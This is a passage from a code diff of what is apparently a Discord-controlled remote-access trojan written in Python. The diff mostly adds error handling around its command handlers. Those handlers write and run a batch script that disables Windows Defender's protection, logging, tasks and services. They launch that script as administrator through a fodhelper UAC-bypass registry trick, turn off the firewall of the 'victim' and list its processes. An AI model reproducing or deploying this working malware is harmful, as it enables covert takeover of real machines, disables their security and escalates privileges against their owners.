-reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
-reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f
-reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
-reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f
-reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
-reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
-reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f
-reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f
-reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f
-reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f
-reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d "2" /f
-cls
-rem 0 - Disable Logging
-reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f
-reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f
-cls
-rem Disable WD Tasks
-schtasks /Change /TN "Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh" /Disable
-schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable
-schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable
-schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
-schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable
-cls 
-rem Disable WD systray icon
-reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "SecurityHealth" /f
-reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f
-cls
-rem Remove WD context menu
-reg delete "HKCR\*\shellex\ContextMenuHandlers\EPP" /f
-reg delete "HKCR\Directory\shellex\ContextMenuHandlers\EPP" /f
-reg delete "HKCR\Drive\shellex\ContextMenuHandlers\EPP" /f
-cls
-rem Disable WD services
-reg add "HKLM\System\CurrentControlSet\Services\WdBoot" /v "Start" /t REG_DWORD /d "4" /f
-reg add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f
-reg add "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f
-reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f
-reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
-cls
-        """
-        temp2 = temp + r"\\av.bat"
-        if os.path.isfile(temp2):
-            os.remove(temp2)
-        f6 = open(temp + r"\\av.bat", 'w')
-        f6.write(bat)
-        f6.close()
+            ###### CREATE BATCH FILE ######
+            temp = (os.getenv("temp"))
+            bat = """
+    reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
+    reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
+    reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f
+    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine" /v "MpEnablePus" /t REG_DWORD /d "0" /f
+    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f
+    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f
+    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f
+    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f
+    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableScanOnRealtimeEnable" /t REG_DWORD /d "1" /f
+    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f
+    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d "1" /f
+    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SpynetReporting" /t REG_DWORD /d "0" /f
+    reg add "HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet" /v "SubmitSamplesConsent" /t REG_DWORD /d "2" /f
+    cls
+    rem 0 - Disable Logging
+    reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f
+    reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderAuditLogger" /v "Start" /t REG_DWORD /d "0" /f
+    cls
+    rem Disable WD Tasks
+    schtasks /Change /TN "Microsoft\Windows\ExploitGuard\ExploitGuard MDM policy Refresh" /Disable
+    schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable
+    schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable
+    schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Scheduled Scan" /Disable
+    schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable
+    cls 
+    rem Disable WD systray icon
+    reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "SecurityHealth" /f
+    reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f
+    cls
+    rem Remove WD context menu
+    reg delete "HKCR\*\shellex\ContextMenuHandlers\EPP" /f
+    reg delete "HKCR\Directory\shellex\ContextMenuHandlers\EPP" /f
+    reg delete "HKCR\Drive\shellex\ContextMenuHandlers\EPP" /f
+    cls
+    rem Disable WD services
+    reg add "HKLM\System\CurrentControlSet\Services\WdBoot" /v "Start" /t REG_DWORD /d "4" /f
+    reg add "HKLM\System\CurrentControlSet\Services\WdFilter" /v "Start" /t REG_DWORD /d "4" /f
+    reg add "HKLM\System\CurrentControlSet\Services\WdNisDrv" /v "Start" /t REG_DWORD /d "4" /f
+    reg add "HKLM\System\CurrentControlSet\Services\WdNisSvc" /v "Start" /t REG_DWORD /d "4" /f
+    reg add "HKLM\System\CurrentControlSet\Services\WinDefend" /v "Start" /t REG_DWORD /d "4" /f
+    cls
+            """
+            temp2 = temp + r"\\av.bat"
+            if os.path.isfile(temp2):
+                os.remove(temp2)
+            f6 = open(temp + r"\\av.bat", 'w')
+            f6.write(bat)
+            f6.close()
 
-        ###### FORCE RUN BATCH FILE AS ADMIN ######
-        create_reg_path = r""" powershell New-Item "HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command" -Force """
-        os.system(create_reg_path)
-        create_trigger_reg_key = r""" powershell New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "hi" -Force """
-        os.system(create_trigger_reg_key) 
-        create_payload_reg_key = r"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "'cmd /c """ + '""' + '"' + '"' + temp2 + '""' +  '"' + '"\'"' + """ -Force"""
-        os.system(create_payload_reg_key)
-        with disable_fsr():
-            os.system("fodhelper.exe")
-        time.sleep(2)
-        remove_reg = r""" powershell Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force """
-        os.system(remove_reg)
+            ###### FORCE RUN BATCH FILE AS ADMIN ######
+            create_reg_path = r""" powershell New-Item "HKCU:\\SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command" -Force """
+            os.system(create_reg_path)
+            create_trigger_reg_key = r""" powershell New-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "DelegateExecute" -Value "hi" -Force """
+            os.system(create_trigger_reg_key) 
+            create_payload_reg_key = r"""powershell Set-ItemProperty -Path "HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command" -Name "`(Default`)" -Value "'cmd /c """ + '""' + '"' + '"' + temp2 + '""' +  '"' + '"\'"' + """ -Force"""
+            os.system(create_payload_reg_key)
+            with disable_fsr():
+                os.system("fodhelper.exe")
+            time.sleep(2)
+            remove_reg = r""" powershell Remove-Item "HKCU:\\Software\\Classes\\ms-settings\\" -Recurse -Force """
+            os.system(remove_reg)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
+            await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="Disablefirewall", description="Disable victims firewall", guild_ids=g)
 async def Disablefirewall_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        import ctypes
-        import os
-        def isAdmin():
-            try:
-                is_admin = (os.getuid() == 0)
-            except AttributeError:
-                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-            return is_admin
-        if isAdmin():
-            os.system("NetSh Advfirewall set allprofiles state off")
-            my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
-            await ctx.send(embed=my_embed)
-        else:
-            my_embed = discord.Embed(title=f"Admin privileges required", color=0xFF0000)
+        try:
+            import ctypes
+            import os
+            def isAdmin():
+                try:
+                    is_admin = (os.getuid() == 0)
+                except AttributeError:
+                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+                return is_admin
+            if isAdmin():
+                os.system("NetSh Advfirewall set allprofiles state off")
+                my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
+                await ctx.send(embed=my_embed)
+            else:
+                my_embed = discord.Embed(title=f"Admin privileges required", color=0xFF0000)
+                await ctx.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
             await ctx.send(embed=my_embed)
 
 
 @slash.slash(name="listProccess", description="List all active proccess", guild_ids=g)
 async def listProccess_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        import os
-        import subprocess
-        if 1==1:
-            result = subprocess.getoutput("tasklist")
-            numb = len(result)
-            if numb < 1:
-                await ctx.send("Command not recognized or no output was obtained")
-            elif numb > 1990:
-                temp = (os.getenv('TEMP'))
-                if os.path.isfile(temp + r"\\output.txt"):
-                    os.system(r"del %temp%\\output.txt /f")
-                f1 = open(temp + r"\\output.txt", 'a')
-                f1.write(result)
-                f1.close()
-                my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
-                await ctx.send(embed=my_embed)
-                file = discord.File(temp + r"\\output.txt", filename="output.txt")
-                await ctx.send(file=file)
-            else:
-                my_embed = discord.Embed(title=f"Command executed : {result}", color=0x00FF00)
-                await ctx.send(embed=my_embed)
+        try:
+            import os
+            import subprocess
+            if 1==1:
+                result = subprocess.getoutput("tasklist")
+                numb = len(result)
+                if numb < 1:
+                    await ctx.send("Command not recognized or no output was obtained")
+                elif numb > 1990:
+                    temp = (os.getenv('TEMP'))
+                    if os.path.isfile(temp + r"\\output.txt"):
+                        os.system(r"del %temp%\\output.txt /f")
+                    f1 = open(temp + r"\\output.txt", 'a')
+                    f1.write(result)
+                    f1.close()
+                    my_embed = discord.Embed(title=f"Command executed", color=0x00FF00)
+                    await ctx.send(embed=my_embed)
+                    file = discord.File(temp + r"\\output.txt", filename="output.txt")
+                    await ctx.send(file=file)
+                else:
+                    my_embed = discord.Embed(title=f"Command executed : {result}", color=0x00FF00)
+                    await ctx.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error occured!\n\n{e}", color=0xFF0000)
+            await ctx.send(embed=my_embed)
 
 
 client.run(token)
